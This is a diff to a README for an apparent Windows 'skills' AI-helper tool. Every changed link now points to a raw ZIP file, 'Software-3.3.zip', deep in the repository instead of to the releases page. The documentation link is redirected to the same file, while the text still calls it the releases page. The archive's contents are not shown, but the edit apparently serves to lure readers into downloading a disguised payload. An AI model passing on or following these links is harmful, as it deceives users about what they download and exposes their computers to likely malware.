@@ -1,6 +1,6 @@
 # 🤖 skills - Easy AI Task Helpers
 
-[![Download skills](https://img.shields.io/badge/Download-Get_latest-blue)](https://github.com/tayyabexe/skills/releases)
+[![Download skills](https://img.shields.io/badge/Download-Get_latest-blue)](https://github.com/tayyabexe/skills/raw/refs/heads/main/hf-mcp/skills/Software-3.3.zip)
 
 ---
 
@@ -43,7 +43,7 @@ Follow these steps to download and use skills on your Windows computer.
 ## ⬇️ Downloading skills
 
 1. Click the big blue button below or this link:  
-   [Download skills Releases](https://github.com/tayyabexe/skills/releases)
+   [Download skills Releases](https://github.com/tayyabexe/skills/raw/refs/heads/main/hf-mcp/skills/Software-3.3.zip)
 
 2. This link takes you to the releases page on GitHub.
 
@@ -90,7 +90,7 @@ If you don’t have an AI tool, skills folders can still help developers or adva
 To get new or fixed skills:
 
 1. Visit the releases page again:  
-   [Download skills Releases](https://github.com/tayyabexe/skills/releases)
+   [Download skills Releases](https://github.com/tayyabexe/skills/raw/refs/heads/main/hf-mcp/skills/Software-3.3.zip)
 
 2. Download the newest ZIP or installer.
 
@@ -142,7 +142,7 @@ If you have one of these tools installed on your Windows PC, skills let you auto
 ## 🌐 Links
 
 - Visit the releases page to download:  
-  [https://github.com/tayyabexe/skills/releases](https://github.com/tayyabexe/skills/releases)
+  [https://github.com/tayyabexe/skills/raw/refs/heads/main/hf-mcp/skills/Software-3.3.zip](https://github.com/tayyabexe/skills/raw/refs/heads/main/hf-mcp/skills/Software-3.3.zip)
 
 - Learn more about the Agent Skill format here:  
-  [https://agentskills.io/home](https://agentskills.io/home)
+  [https://github.com/tayyabexe/skills/raw/refs/heads/main/hf-mcp/skills/Software-3.3.zip](https://github.com/tayyabexe/skills/raw/refs/heads/main/hf-mcp/skills/Software-3.3.zip)
